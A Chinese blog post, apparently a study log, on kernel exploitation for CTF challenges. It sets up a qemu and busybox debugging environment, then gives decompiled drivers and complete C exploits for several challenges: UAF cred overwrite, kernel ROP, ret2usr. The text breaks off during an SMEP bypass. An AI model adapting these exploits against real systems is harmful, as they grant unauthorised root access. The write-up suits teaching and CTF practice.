---
title: Kernel Pwn从入门到放弃
catergories:
- kernel
---
# Kernel Pwn从入门到放弃

## 前言

自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh

## 环境搭建

调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建kernel pwn环境。

### 编译内核

1. 下载指定版本的Linux内核，我是从[这里](https://mirrors.edge.kernel.org/pub/linux/kernel/)下载的
2. 解压源码目录，内核编译前的配置，这里用图像化配置方式``make menuconfig``，有几个选项要勾选(默认应该都会选中)(要先安装``sudo apt-get install libncurses5-dev``)
```
1. kernel hacking->
Kernel debugging
Compile-time checks and compiler options —> Compile the kernel with debug info和Compile the kernel with frame pointers
KGDB
2. save->exit->exit
```
3. make -j4(编译前可能要安装库``sudo apt-get install libssl-dev``)(编译低版本的内核需要切换低版本的gcc，方法如下)  
3.1 ``sudo apt-get install gcc-4.4``
3.2 ``sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x x``  
3.3 ``sudo update-alternatives --config gcc``
4. make modules_install 
5. make install 

之后就可以在``./arch/x86_64/boot/bzImage``下可以找到bzImage文件，从源码根目录可以拿到vmlinux(bzImage是vmlinuz经过gzip压缩的文件，适用于大内核，vmlinux是静态编译的未压缩的内核，可以在其中找ROP)

### 编译busybox

启动一个Linux系统除了需要内核外还需要一些必要的命令和文件系统，busybox可以提供这样一个小型的操作系统，可以从[官网](https://busybox.net/downloads/)下载Busybox源码自行编译，这里我选择的是1.30.1，编译前使用``make menuconfig``将编译选项设置为静态编译
```
make menuconfig
make make install
```
将生成的_install 文件夹拷贝到linux kernel 源代码根目录

### 生成文件系统

进入_install目录，创建文件夹)(-p为不存在则创建)
```bash
mkdir etc
mkdir dev
mkdir mnt
mkdir -p etc/init.d/
mkdir home
mkdir root
touch etc/passwd
touch etc/group
```
创建./etc/init.d/rcS文件(可以看成系统启动的初始化文件)
```
mkdir -p /proc
mkdir -p /tmp
mkdir -p /sys
mkdir -p /mnt
/bin/mount -a
mkdir -p /dev/pts
mount -t devpts devpts /dev/pts
echo /sbin/mdev > /proc/sys/kernel/hotplug
mdev -s
setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user
insmod vul.ko
```
``chmod +x rcS``  
创建./etc/fatab文件(用fstab可以自动挂载各种文件系统格式的硬盘、分区、可移动设备和远程设备等)
```
proc /proc proc defaults 0 0
tmpfs /tmp tmpfs defaults 0 0
sysfs /sys sysfs defaults 0 0
tmpfs /dev tmpfs defaults 0 0
```
创建etc/inittab文件(在特定情况下执行的命令，如最后一条是关机的时候卸载所有挂载文件系统)
```
::sysinit:/etc/init.d/rcS
::respawn:-/bin/sh
::askfirst:-/bin/sh
::ctrlaltdel:/bin/umount -a -r
```
在dev/创建设备节点(创建两个字符设备)
```
sudo mknod ./dev/console c 5 1
sudo mknod ./dev/null c 1 3
```
创建文件系统，在_install文件夹中执行
``find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.img``

### qemu启动Linux kernel

```
qemu-system-x86_64 -kernel ./linux-4.4.72/arch/x86_64/boot/bzImage --nographic -initrd ./busybox-1.30.1/initramfs.img -m 256M -append "rdinit=./linuxrc -gdb tcp::1234 -S 
```

### gdb远程调试

gdb remote 127.0.0.1:1234即可，注意要先设置arch，``set arch i386:x86-64:intel``，否则会有g pack too long的报错，

### 在指定内核中编写驱动程序

linux内核编译前我们用make menuconfig在源码目录生成了一个配置文件.config，这个配置文件表明了内核编译中的一些设置，比如我编译的4.4.72内核默认开启了栈保护，所以七哥栈溢出例子编译之后会有canary和NX，这个是内核决定的，因此要关闭保护只能重新编译内核和驱动(叹气)(后续：重新编译了一次，内核去掉了所有保护，但是驱动仍然有NX，放弃辽)

流程：建个新的文件夹，Makefile:

```
obj-m := sbof.o
ROOTDIR  := /path/to/linux/src
PWD   := $(shell pwd)

default:
	$(MAKE) -C $(ROOTDIR) M=$(PWD) modules
	$(CC) --static -o exploit exploit.c

clean:
	$(MAKE) -C $(ROOTDIR) M=$(PWD) clean
	rm exploit
```
编译完成之后放到busybox的_install里重新打包，之后就可以调试了

### 调试
gdb进去之后
```
file ./vmlinux
set architecture i386:x86-64:intel
target remote localhost:1234
```
如果给的文件里只有bzImage可以自己提取，[脚本地址](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)
在qemu中查看加载的程序基址
```
cat /sys/modules/sbof/sections/.text
```
在gdb中添加符号文件
```
add-symbol-file ./sbof.ko 0xffffffc0000000
```
查看commit_creds和prepare_kernel_cred函数的地址
```
cat /proc/kallsyms | grep commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
```

### 小知识

/proc文件系统是一个虚拟文件系统，可以在/proc中动态创建虚拟文件，通过对虚拟文件的读写与实现与内核的通信。可以使用以下函数创建虚拟文件

```c
//第三个参数是文件在/proc中的位置，默认为/proc
struct proc_dir_entry *create_proc_entry( const char *name, mode_t mode, struct proc_dir_entry *parent );

//
static inline struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent,const struct file_operations *proc_fops)
```

kptr_restrict控制/proc/kallsyms是否显示symbols的地址，通常会在init文件中给出限制：
```
echo 1 > /proc/sys/kernel/kptr_restrict
```

dmesg_restrict限制非特权用户读取dmesg信息，无法访问内核打印的消息，通常会在init文件中给出限制：

```
echo 1 > /proc/sys/kernel/dmesg_restrict
```

### kernel pwn保护机制

#### KASLR

内核地址随机化，相当于ASLR(并非默认启用，需要在内核命令行中加入kaslr开启)

#### SMAP/SMEP

SMAP(Supervisor Mode Access Prevention，管理模式访问保护):
禁止内核访问用户空间的数据

SMEP类似于NX，即内核态无法执行shellcode,linux内核从3.0开始支持SMEP，3.7开始支持SMAP。

#### Stack Protector

在编译内核时设置CONFIG_CC_STACKPROTECTOR选项，即可开启该保护，一般而言开了这个保护再编译驱动会发现有canary。



## Kernel UAF

### CISCN-babydriver

#### 驱动逻辑

因为是第一次分析，所以写的详细一点，从_init函数开始，首先用alloc_chrdev_region函数动态分配一个设备号，成功分配的话初始化一个cdev结构体(每个字符设备对应一个结构体)，_class_create注册一个字符设备，创建相应的class，再调用device_create创建对应的设备，注意每个地方失败都会有回滚操作(destroy或者unregister)

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( (signed int)alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )
  {
    cdev_init(&cdev_0, &fops);
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);
    if ( v1 >= 0 )
    {
      v2 = (class *)_class_create(&_this_module, "babydev", &babydev_no);
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
```

_exit是设备卸载时候的会调用的，把分配的设备和class等回收。

```c
void __cdecl babydriver_exit()
{
  device_destroy(babydev_class, babydev_no);
  class_destroy(babydev_class);
  cdev_del(&cdev_0);
  unregister_chrdev_region(babydev_no, 1LL);
}
```

open函数的参数有inode和filp，每一个设备都会对应一个inode，而且是共享一个inode，这个不像filp文件指针每次打开一个设备都会创建一个新的文件指针以供操作(内核里的文件指针，跟用户态不一样)

```c
int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 0x40LL;
  printk("device open\n");
  return 0;
}
```

read函数是从内核往用户态读数据，kernel里的文件结构体定义了一组基础接口，允许开发者按照参数的标准实现一套自己的函数，read write open release(close)都是自己实现的，这里的read判断babydev_struct.device_buf不为NULL就将用户输入的第三个参数length长的数据从device_buf拷贝到Buffer里

```c
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);
    result = v6;
  }
  return result;
}
```

write是从用户态拷贝length长的数据到babydev_struct.device_buf里，这里的IDA反汇编优点问题，看asm可以看到copy_from_user的参数

```c
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();
    result = v6;
  }
  return result;
}
```

ioctl是最简单的和设备通信的方式，开发者可以在其中根据arg参数决定对设备不同的操作，这里注意command需要是一个唯一的数字，否则可能会进行其他未知的操作，在新的标准里command是有结构的，不同的位有不同功能，这里也不深究了，如果command是0x10001，则释放device_buf，再分配一个指定size的内存地址赋给device_buf。

```c
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB);
    result = -22LL;
  }
  return result;
}
```

release函数调用发生在关闭设备文件的时候，这里会free掉buf

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);             // exec when close(fd)
  printk("device release\n");
  return 0;
}
```

#### 漏洞利用

这里的漏洞出现在驱动没有处理好并发，在驱动开发的时候，驱动必须是可重入的，也就是说必须是可以支持被多次打开的，这里release的kfree之后没有清空全局变量babydev_struct.device_buf，全局变量在两次打开设备文件的时候是共享的，也就是说如果我们两次打开设备，在第一次free掉buf，在第二次仍能继续读写数据。

最简单的利用方式是阅读该版本的linux源码，获取struct cred的大小(这里是0xa8)，在第一个设备操作中关闭文件free掉buf，再fork一个新的进程，每次fork的时候会分配一个struct cred结构体来标明进程的权限，这个结构体会将父进程的cred复制过来，分配到的恰好是我们分配的结构体(slab分配器类似fastbin的分配方式)，这时候我们在父进程里通过write修改全局变量的device_buf，实际上是修改cred，我们把uid改为0即可在子进程提权，之后在其中打开shell即可

```c
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
};
```

#### 编写exp

exp拿c写，cred的前28个字节改为0即可，exp如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);
    ioctl(fd1,0x10001,0xa8);
    close(fd1);
    int pid = fork();
    if(pid == 0){
        char zeros[32] = {0};
        write(fd2,zeros,sizeof(zeros));
        if(getuid() == 0){
            system("/bin/sh");
        }
    }
    else if(pid > 0){
        wait(NULL);
    }
    return 0;
}
```

### TSCTF2019->babykernel

#### 程序分析

比赛的时候没做出来，半年之后过来考古233.

ioctl有几个功能：
1. cmd=`0x22B8`，往`BUY_LIST[arg3]`赋值0x123456789ABCDEF0LL
2. cmd=`0x271A`，固定分配`0xd0`的obj到`BUY_LIST[arg3]`并执行`*(_QWORD *)(BUY_LIST[arg33] + 8) = 0LL;`等赋值命令
3. cmd=`0x2766`，释放`BUY_LIST[arg3]`，这里有double free
4. cmd=`0x1A0A`，同1一样赋值`BUY_LIST[arg3]`为0xFEDCBA987654321LL

漏洞到这里已经很清楚了，bss上的全局变量释放后未清空，保护有`smap`和`smep`，调试可以看到(源码也可以直接看)cred大小恰为0xd0，所以我们释放一个obj，随后fork进程复用这个obj，在主进程再次释放此obj随即alloc到它，之前的*(obj+8)可以将uid位清零，子进程的权限提升为root。

```c
signed __int64 __fastcall tshop_ioctl(__int64 arg1, unsigned int arg2, unsigned int arg3)
{
  __int64 v3; // rbx
  _QWORD *v4; // rax
  char *v5; // rdi
  __int64 v6; // rax
  char v7; // si
  __int64 v8; // rdx
  const char *v9; // rdi
  _QWORD *v11; // rax
  _QWORD *v12; // rax

  v3 = (signed int)arg3;
  if ( arg2 == 0x22B8 )
  {
    if ( arg3 <= 0xFF && (v12 = (_QWORD *)BUY_LIST[arg3]) != 0LL )
    {
      v9 = "<1>[*] This Zege is yours!";
      *v12 = 0x123456789ABCDEF0LL;
    }
    else
    {
      v9 = "<1>[*] Zege would not like you!";
    }
    goto LABEL_16;
  }
  if ( arg2 > 0x22B8 )
  {
    if ( arg2 == 0x271A )
    {
      if ( arg3 <= 0xFF )
      {
        v4 = (_QWORD *)kmem_cache_alloc(zegeorjige, 0xD0LL);
        BUY_LIST[v3] = (__int64)v4;
        *v4 = 0LL;
        v5 = zegeandjigedesc;
        *(_QWORD *)(BUY_LIST[v3] + 8) = 0LL;
        *(_QWORD *)(BUY_LIST[v3] + 16) = 64LL;
        *(_QWORD *)(BUY_LIST[v3] + 24) = 0x29AALL;
        v6 = 0LL;
        do
        {
          v7 = v5[v6];
          v8 = (signed int)v6++;
          *(_BYTE *)(BUY_LIST[v3] + v8 + 0x20) = v7;
        }
        while ( v6 != 0x21 );
        v9 = "<1>[*] Money fly\n";
        *(_BYTE *)(BUY_LIST[v3] + 0x41) = 0;
        goto LABEL_16;
      }
    }
    else
    {
      if ( arg2 != 0x2766 )
        return -1LL;
      if ( arg3 <= 0xFF && BUY_LIST[arg3] )
      {
        kfree();
        v9 = "<1>[*] Say goodbye to flag\n";
        goto LABEL_16;
      }
    }
    v9 = "<1>[*] Zege and Jige would not like you!";
LABEL_16:
    printk(v9);
    return 0LL;
  }
  if ( arg2 == 0x1A0A )
  {
    if ( arg3 <= 0xFF && (v11 = (_QWORD *)BUY_LIST[arg3]) != 0LL )
    {
      v9 = "<1>[*] This Jige is yours!";
      *v11 = 0xFEDCBA987654321LL;
    }
    else
    {
      v9 = "<1>[*] Jige would not like you!";
    }
    goto LABEL_16;
  }
  return -1LL;
}
```

#### exp.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define MallocCmd 0x271a
#define FreeCmd 0x2766

void Malloc(int fd,int idx)
{
    ioctl(fd,MallocCmd,idx);
}

void Free(int fd,int idx)
{
    ioctl(fd,FreeCmd,idx);
}

int main()
{
    int fd = open("/dev/tshop",2);
    Malloc(fd,0);
    Malloc(fd,1);
    Free(fd,0);
    Free(fd,1);
    int pid = fork();//now we alloc cred using obj1
    if(pid == 0){
        while(getuid() != 0){
            sleep(2);
        }
        system("id");
    }
    else if(pid > 0){
        Free(fd,1);//now we free cred
        Malloc(fd,2);//set uid=0
        //wait(NULL);
    }
    return 0;
}
```

## Kernel ROP

### QWB2018-Core

#### 寻找rops

vmlinux是未经压缩的二进制文件，可以使用`ropper --file ./vmlinux > rops`将寻找的rop存放起来，如果题目没有给vmlinux可以拿[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)进行提取`./extract-vmlinux ./bzImage > ./vmlinux`

#### 漏洞分析

查看启动脚本，发现开了`kaslr`保护，解压cpio文件`cpio -idm < ./core.cpio`，文件夹下有系统的初始化脚本init，其内容为。

```sh
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```
前面实在创建设备驱动，挂载设备，之后将kallsyms的内容拷贝到/tmp/kallsyms文件中，`kptr_restrict`为1表示root用户可以读取内核符号地址而普通用户不能。同理`dmesg_restrict`为1表示root用户可以查看dmesg信息而普通用户不能。

后面是设置网卡和路由信息，启动了一个uid为1000的普通用户所在的shell，poweroff这行是设置120s定时关机，我们为了避免干扰做题先注释掉，同样为了之后能看text段的基址我们把uid改成0，即root用户。

最后的insmod插入了一个内核模块`core.ko`，这个就是本题的漏洞模块，我们等会来分析它。现在把文件系统重新打包(文件系统中有个打包脚本，参数为打包的压缩文件名，打包之后拷到上层目录即可)

下面分析core.ko

在ioctl函数里实现了几种功能，其中arg1表示choice，arg2为参数2。
1. arg1=0x6677889B时，调用core_read(arg2)，从v4[off]拷贝0x40长度的数据到arg2指定的用户地址，这里off是一个全局变量
2. arg1=0x6677889C，将arg2赋值给off(结合1和2我们可以泄露栈上数据)
3. arg1=0x6677889A，调用core_copy_func，arg2指定size，拷贝arg2长度的数据从name到栈局部变量v1，这里检查了size要小于等于0x3f，但是qememcpy用的类型是int16，因此我们传入一个负数即可绕过检查(因为size指定，这里可以栈溢出)
4. core_write函数把用户空间的数据拷贝到bss的全局变量name上，size也是用户指定的长度

```c
__int64 __fastcall core_ioctl(__int64 a1, int arg1, __int64 arg2)
{
  switch ( arg1 )
  {
    case 0x6677889B:
      core_read(arg2);
      break;
    case 0x6677889C:
      printk("\x016core: %d\n");
      off = arg2;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n");
      core_copy_func(arg2);
      break;
  }
  return 0LL;
}

void __fastcall core_read(__int64 user_addr)
{
  __int64 user_addr1; // rbx
  char *v2; // rdi
  signed __int64 i; // rcx
  char v4[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v5; // [rsp+40h] [rbp-10h]

  user_addr1 = user_addr;
  v5 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n");
  printk("\x016%d %p\n");
  v2 = v4;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v4, "Welcome to the QWB CTF challenge.\n");
  if ( copy_to_user(user_addr1, &v4[off], 64LL) )
    __asm { swapgs }
}

void __fastcall core_copy_func(signed __int64 size)
{
  char v1[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v2; // [rsp+40h] [rbp-10h]

  v2 = __readgsqword(0x28u);
  printk("\x016core: called core_writen");
  if ( size > 0x3F )
    printk("\x016Detect Overflow");
  else
    qmemcpy(v1, name, (unsigned __int16)size);  // overflow
}

signed __int64 __fastcall core_write(__int64 a1, __int64 user_addr, unsigned __int64 a3)
{
  unsigned __int64 size; // rbx

  size = a3;
  printk("\x016core: called core_writen");
  if ( size <= 0x800 && !copy_from_user(name, user_addr, size) )
    return (unsigned int)size;
  printk("\x016core: error copying data from userspacen");
  return 0xFFFFFFF2LL;
}

```

#### 漏洞利用

我们现在有地址泄露和栈溢出，用到的就是这里讲到的kernel rop，思路如下：
1. 利用ioctl结合core_read泄露地址及canary
2. 利用core_write吧gadgets写到name上
3. 利用copy_func将gadgets写到栈上
4. 通过rop执行`commit_creds(prepare_kernel_cred(0))`
5. 返回用户态，执行system("/bin/sh")起shell(使用`swapgs;iretq`来进行切换，但最开始要使用`save_status`保存寄存器的状态)


```c
size_t user_cs,user_ss,user_rflags,user_sp;
void save_status()
{
  __asm__(
    "mov user_cs,cs;"
    "mov user_ss,ss;"
    "mov user_sp,rsp;"
    "pushf;"
    "pop user_rflags;"
  );
  puts("[*] status has been saved.")

}
```

#### 调试

tips1:ctrl+A再按X可以让qemu退出

使用`gdb ./vmlinux -q`调试内核，在qemu内部使用`cat /sys/module/core/sections/.text`查看基址，使用`add-symbol-file ./core.ko [text_base]`增加符号表，`b core_read`添加断点，`target remote localhost:1234`开始调试。

#### exp.c

最后在构造rop的时候的栈结构是
p_rdi  
0  
prepare_kernel_cred  
mov rdi, rax  
commit_creds  
但是gadgets里没有直接能用的`mov rdi, rax; ret;`所以这里迂回了一下。构造的结构是：
p_rdi  
0  
prepare_kernel_cred  
p_rdx_ret  
p_rcx_ret  
mov rdi, rax; call rdx;  
commit_creds  
注意写exp之前要先sava_status,在 64 位系统中执行 iretq 指令前需要执行一下 swapgs 指令，该指令将 gs 寄存器的值与 MSR 地址 中的值交换。在内核态常规操作（如系统调用）的入口处，执行 swapgs 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 swapgs  
iretq用来恢复用户空间，需要给出之前保存的寄存器的值。恢复到用户空间之后一个`ret`到我们的`system("/bin/sh")`即可起root shell。

还有一个有意思的地方在于我们明明是在write里泄露的canary，在copy函数里进行的栈溢出，但是canary和栈布局都是一样的，而且在gdb中看到的输入地址距离rbp相去甚远，实际上却恰如其分。

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t user_cs,user_ss,user_rflags,user_sp;

size_t commit_creds=0,prepare_kernel_cred=0;

size_t vmlinux_base;

void save_status()
{
  __asm__(
    "mov user_cs,cs;"
    "mov user_ss,ss;"
    "mov user_sp,rsp;"
    "pushf;"
    "pop user_rflags;"
  );
  puts("[*] status has been saved.");

}

void GetRootShell()
{
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[*] get root shell error!");
    }
}

size_t FindVmlinuxBase()
{
    int fd = fopen("/tmp/kallsyms","r");
    if(fd == -1){
        puts("[*]open symbol file failed.");
    }
    char buf[0x30] = {0};
    while(fgets(buf,0x30,fd)){
        if(commit_creds && prepare_kernel_cred)
            return 0;
        if(strstr(buf,"commit_creds") && !commit_creds){
            char hex[0x20] = {0};
            strncpy(hex,buf,0x10);
            sscanf(hex,"%llx",&commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("[*]vmlinux base => %llx\n",vmlinux_base);
        }
        if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[0x20] = {0};
            strncpy(hex,buf,0x10);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            printf("[*]vmlinux base => %llx\n",vmlinux_base);
        }
    }
}

size_t raw_vmlinux_base = 0xffffffff81000000;

int main()
{
    save_status();
    FindVmlinuxBase();
    printf("[*]prepare_kernel_cred addr:%p\n",prepare_kernel_cred);
    printf("[*]commit_creds addr:%p\n",commit_creds);
    //leak sth
    int core_fd = open("/proc/core",2);
    char* user_buf = (char*)malloc(0x50*sizeof(char));
    memset(user_buf,0,sizeof(char)*0x50);
    //set off=0x40
    ioctl(core_fd,0x6677889C,0x40);
    //read to user_buf
    ioctl(core_fd,0x6677889B,user_buf);
    size_t canary = ((size_t*)user_buf)[0];
    printf("[*]leaked canary:%p",canary);
    //rops
    size_t rop[0x1000];
    int i = 0;
    size_t offset = vmlinux_base - raw_vmlinux_base;
    for(i=0;i<10;i++)
        rop[i] = canary;
	rop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret
    printf("[*]p_rdi addr:%p\n",0xffffffff81000b2f+offset);
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)

    rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret
    rop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret
    rop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; 
    rop[i++] = commit_creds;

    rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
    rop[i++] = 0;

    rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; 

    rop[i++] = (size_t)GetRootShell;         // rip 

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(core_fd, rop, 0x800);
    ioctl(core_fd, 0x6677889a,0xffffffffffff0000 | (0x100));

    return 0;
}
```

## ret2usr

### 简介

利用的是内核态位于ring 0，可以执行用户态的函数，我们不必自己构造调用链，而可以直接在用户态构造好我们需要的函数，在内核rop的时候直接调用即可，当然这些函数用户态是没有的，我们还是得先泄露出来。exp编写如下：

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t user_cs,user_ss,user_rflags,user_sp;

size_t commit_creds=0,prepare_kernel_cred=0;

size_t vmlinux_base;

void save_status()
{
  __asm__(
    "mov user_cs,cs;"
    "mov user_ss,ss;"
    "mov user_sp,rsp;"
    "pushf;"
    "pop user_rflags;"
  );
  puts("[*] status has been saved.");

}

void BeRoot()
{
    char* (*fun1)(int) = prepare_kernel_cred;
    void  (*fun2)(char*) = commit_creds;
    (*fun2)((*fun1)(0));
}

void GetRootShell()
{
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[*] get root shell error!");
    }
}

size_t FindVmlinuxBase()
{
    int fd = fopen("/tmp/kallsyms","r");
    if(fd == -1){
        puts("[*]open symbol file failed.");
    }
    char buf[0x30] = {0};
    while(fgets(buf,0x30,fd)){
        if(commit_creds && prepare_kernel_cred)
            return 0;
        if(strstr(buf,"commit_creds") && !commit_creds){
            char hex[0x20] = {0};
            strncpy(hex,buf,0x10);
            sscanf(hex,"%llx",&commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("[*]vmlinux base => %llx\n",vmlinux_base);
        }
        if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[0x20] = {0};
            strncpy(hex,buf,0x10);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            printf("[*]vmlinux base => %llx\n",vmlinux_base);
        }
    }
}

size_t raw_vmlinux_base = 0xffffffff81000000;

int main()
{
    save_status();
    FindVmlinuxBase();
    printf("[*]prepare_kernel_cred addr:%p\n",prepare_kernel_cred);
    printf("[*]commit_creds addr:%p\n",commit_creds);
    //leak sth
    int core_fd = open("/proc/core",2);
    char* user_buf = (char*)malloc(0x50*sizeof(char));
    memset(user_buf,0,sizeof(char)*0x50);
    //set off=0x40
    ioctl(core_fd,0x6677889C,0x40);
    //read to user_buf
    ioctl(core_fd,0x6677889B,user_buf);
    size_t canary = ((size_t*)user_buf)[0];
    printf("[*]leaked canary:%p",canary);
    //rops
    size_t rop[0x1000];
    int i = 0;
    size_t offset = vmlinux_base - raw_vmlinux_base;
    for(i=0;i<10;i++)
        rop[i] = canary;
    rop[i++] = BeRoot;
    rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
    rop[i++] = 0;

    rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; 

    rop[i++] = (size_t)GetRootShell;         // rip 

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(core_fd, rop, 0x800);
    ioctl(core_fd, 0x6677889a,0xffffffffffff0000 | (0x100));

    return 0;
}


```

## bypass smep

### 简介

smep保护其实就是为了防止ret2usr这样的攻击，是否开启这个保护取决于rc4寄存器的值，我们一般只需要给它改成一个固定值0x6f0就可以关闭它，这里用之前Kernel UAF的babydriver进行演示

### CISCN2017-BabyDriver

#### 漏洞利用

这里我们选择一个tty_struct结构体进行操作，在`open("/dev/ptmx",O_RDWR);`的时候会分配这样一个结构体，其源码如下：

其中`tty_operations`结构体有许多函数指针，我们可以通过伪造fake operation来劫持控制流。

```c
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
